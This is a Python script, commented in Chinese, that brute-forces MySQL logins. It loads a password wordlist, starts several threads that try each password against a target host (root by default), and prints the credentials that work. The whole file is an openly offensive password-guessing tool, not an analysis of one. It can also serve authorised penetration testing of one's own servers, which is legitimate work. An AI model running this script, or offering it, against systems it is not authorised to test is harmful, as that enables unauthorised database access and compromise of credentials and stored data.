import pymysql
import threading
import queue
import argparse
# 
class brute_mysql_thread(threading.Thread):
    def __init__(self,host,user,q):
        threading.Thread.__init__(self)
        self.host = host
        self.user = user
        self.q = q
    def run(self):
        while not self.q.empty():
            password = self.q.get()
            state = brute_mysql(self.host,self.user,password)
            if state == True:
                self.q.queue.clear()
                break
            elif state == False:
                continue
# mysql连接
def brute_mysql(host,user,password):
    try:
        db  = pymysql.connect(host,user,password)
        print("[+] Success host:%s user:%s password:%s" %(host,user,password))
        return True
    except:
        print("[-] user:%s password:%s" %(user,password))
        return False
    else:
        db.close()
# 获取字典密码以队列形式返回
def get_password(drib):
    q = queue.Queue()
    with open(drib) as f:
        for line in f:
            password = line.strip('\r').strip('\n')
            q.put(password)
    return q
# 命令行解析
def parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-r','--rhost',dest='rhost',help="Set Destination host address")
    parser.add_argument('-u','--user',dest='user',default='root',help="Set mysql username")
    parser.add_argument('-f','--file',dest='file',help="Set Dictionary directories")
    parser.add_argument('-t','--thread',dest='thread',default=10,help="Set thread count,Default=10")
    args = parser.parse_args()
    return args
# 配置参数
def main():
    '''
    dirb = '/usr/share/wordlists/dirb/small.txt'
    host = '172.20.10.139'
    user = 'mysql'
    '''
    # 创建解析
    args = parser()
    # 设置目标主机地址
    host = args.rhost
    # 设置mysql用户名
    user = args.user
    # 设置字典目录
    dirb = args.file
    # 设置线程
    thread = args.thread
    # 存放线程列表
    threads = []
    # 获取字典内容以队列形式返回
    q = get_password(dirb)
    # 创建线程
    for i in range(thread):
        # 创建新线程
        thread = brute_mysql_thread(host,user,q)
        # 开启线程
        thread.start()
        # 添加到列表
        threads.append(thread)
    # 等待所有线程完成
    for t in threads:
        t.join()

if __name__=='__main__':
    main()
